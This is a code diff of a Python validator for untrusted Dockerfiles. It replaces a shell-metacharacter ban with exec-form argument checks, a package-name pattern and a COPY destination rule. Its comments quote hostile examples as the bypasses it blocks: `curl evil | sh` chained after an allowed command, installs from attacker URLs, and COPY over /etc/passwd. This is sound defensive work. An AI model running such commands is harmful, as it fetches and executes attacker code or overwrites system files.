@@ -11,21 +11,38 @@ repair evidence, so it says what is wrong rather than merely that something is.
 from __future__ import annotations
 
 import json
+import re
 
 INSTRUCTIONS = ("FROM", "COPY", "RUN", "USER", "CMD", "ENTRYPOINT")
 
-# Anything that lets one RUN become two commands, read a file, write a file, or
-# expand into something else. The allowlist below would be meaningless without this,
-# since `apt-get update && curl evil | sh` starts with an allowed prefix.
-SHELL_METACHARACTERS = "&|;$`><()\n\r"
+# Characters Python's splitlines() treats as line breaks and Docker does not. With any
+# of them present the two disagree about what a line is, and every per-line rule below
+# is reasoning about a file Docker will never see. Refusing them outright is what makes
+# "one physical line is one instruction" true rather than nearly true.
+EXOTIC_BREAKS = "\v\f\x1c\x1d\x1e\x85\u2028\u2029"
 
-RUN_PREFIXES = (
-    "pip install",
-    "pip3 install",
-    "python -m pip install",
-    "apt-get update",
-    "apt-get install",
+# RUN is exec form, so there is no shell and nothing to escape into. That is why this
+# is a list of argv heads rather than a list of string prefixes: `pip install` as a
+# string prefix also matches `pip install --index-url https://evil.example/ foo`.
+RUN_COMMANDS = (
+    ("pip", "install"),
+    ("pip3", "install"),
+    ("python", "-m", "pip", "install"),
+    ("apt-get", "update"),
+    ("apt-get", "install"),
 )
+
+RUN_FLAGS = frozenset({"-y", "--no-cache-dir", "--no-input", "--quiet"})
+
+# A package name, optionally with a version specifier. Deliberately narrow: it admits
+# `flask>=2.0,<4` and refuses `https://evil.example/x.tar.gz`, `git+https://...`,
+# `/app/x.deb`, and `--target`, all of which are ways to install something other than
+# a named package from the default index.
+PACKAGE = re.compile(r"^[A-Za-z0-9][A-Za-z0-9._+-]*([<>=!~][^\s]*)?$")
+
+# Everything COPY writes lands here, so a Dockerfile cannot overwrite /etc/passwd or
+# shadow an interpreter on PATH with a file whose contents the attacker controls.
+COPY_DESTINATION = "/app/"
 
 
 def _reason(number: int, line: str, problem: str) -> str:
@@ -68,41 +85,74 @@ def _check_copy(number: int, line: str, allowed_files: frozenset[str]) -> str | 
     parts = line.split()
     if len(parts) != 3:
         return _reason(number, line, "COPY takes exactly a source and a destination")
-    source = parts[1]
+    source, destination = parts[1], parts[2]
     if source not in allowed_files:
         return _reason(number, line,
                        f"COPY may only name {', '.join(sorted(allowed_files))}")
+    if not destination.startswith(COPY_DESTINATION):
+        # Only the source was checked until 2026-08-24, so `COPY s.py /etc/passwd` and
+        # `COPY s.py /usr/local/bin/python` both passed. The contents are attacker
+        # controlled either way, so this grants nothing new, but there is no reason a
+        # build should be able to choose where they land.
+        return _reason(number, line, f"COPY destination must be under {COPY_DESTINATION}")
     return None
 
 
 def _check_run(number: int, line: str) -> str | None:
-    command = line[len("RUN"):].strip()
-    if not command:
-        return _reason(number, line, "RUN needs a command")
-    found = next((c for c in SHELL_METACHARACTERS if c in command), None)
-    if found is not None:
-        return _reason(number, line,
-                       f"no shell metacharacters in RUN, found {found!r}. "
-                       "Use one RUN per command")
-    if not any(command == p or command.startswith(p + " ") for p in RUN_PREFIXES):
-        return _reason(number, line,
-                       f"RUN must start with one of: {', '.join(RUN_PREFIXES)}")
+    """RUN is exec form, which is what makes its arguments inspectable.
+
+    Shell form would be `/bin/sh -c "pip install x"`, so the only defence available is
+    banning shell metacharacters in a string. That ban is a proxy for "no shell will
+    interpret this", and it has collateral: `>` and `<` are redirection operators and
+    version-specifier operators at the same time, so `pip install "flask>=2.0"` is
+    refused for looking like a redirect. Exec form makes the proxy unnecessary, because
+    there is no shell, and it turns the command into a list we can check argument by
+    argument instead of a prefix we can only match against.
+    """
+    argv = _exec_form(number, line, "RUN")
+    if isinstance(argv, str):
+        return argv
+    prefix = next((p for p in RUN_COMMANDS if tuple(argv[:len(p)]) == p), None)
+    if prefix is None:
+        allowed = ", ".join(" ".join(p) for p in RUN_COMMANDS)
+        return _reason(number, line, f"RUN must be one of: {allowed}")
+    for argument in argv[len(prefix):]:
+        if argument in RUN_FLAGS:
+            continue
+        if argument.startswith("-"):
+            return _reason(number, line,
+                           f"the flag {argument!r} is not allowed. "
+                           f"Permitted: {', '.join(sorted(RUN_FLAGS))}")
+        if not PACKAGE.match(argument):
+            return _reason(number, line,
+                           f"{argument!r} is not a package name. Install named packages "
+                           "from the default index, not URLs, git references or paths")
     return None
 
 
-def _check_exec_form(number: int, line: str, keyword: str) -> str | None:
+def _exec_form(number: int, line: str, keyword: str) -> list[str] | str:
+    """The argv, or the reason it is not one.
+
+    Shell form re-splits inside `/bin/sh -c`, which is the string-versus-list problem
+    the sandbox already refuses to make with the docker command itself.
+    """
     rest = line[len(keyword):].strip()
     try:
         parsed = json.loads(rest)
     except json.JSONDecodeError:
-        # Shell form re-splits inside `/bin/sh -c`, which is the string-versus-list
-        # problem the sandbox already refuses to make with the docker command itself.
-        return _reason(number, line, f"{keyword} must be exec form, a JSON array")
+        return _reason(number, line,
+                       f'{keyword} must be exec form, a JSON array, '
+                       f'for example {keyword} ["pip", "install", "requests"]')
     if not isinstance(parsed, list) or not parsed:
         return _reason(number, line, f"{keyword} must be a non-empty JSON array")
     if not all(isinstance(item, str) for item in parsed):
         return _reason(number, line, f"{keyword} array must hold only strings")
-    return None
+    return parsed
+
+
+def _check_exec_form(number: int, line: str, keyword: str) -> str | None:
+    result = _exec_form(number, line, keyword)
+    return result if isinstance(result, str) else None
 
 
 def check(dockerfile: str, base_image: str,
@@ -116,6 +166,10 @@ def check(dockerfile: str, base_image: str,
     """
     if not dockerfile.strip():
         return "the Dockerfile is empty"
+    exotic = next((c for c in EXOTIC_BREAKS if c in dockerfile), None)
+    if exotic is not None:
+        return (f"the Dockerfile contains {exotic!r}, which Python counts as a line "
+                "break and Docker does not, so the two would read different files")
 
     seen_from = False
     seen_command = False
@@ -124,7 +178,14 @@ def check(dockerfile: str, base_image: str,
         if line.rstrip().endswith("\\"):
             return _reason(number, line, "no line continuations, one instruction per line")
         stripped = line.strip()
-        if not stripped or stripped.startswith("#"):
+        if stripped.startswith("#"):
+            if re.match(r"#\s*(escape|syntax)\s*=", stripped):
+                # A parser directive changes how Docker reads the rest of the file,
+                # including which character continues a line. Nothing legitimate here
+                # needs one, and it is attacker-controlled surface either way.
+                return _reason(number, line, "no parser directives")
+            continue
+        if not stripped:
             continue
 
         keyword = stripped.split(maxsplit=1)[0].upper()
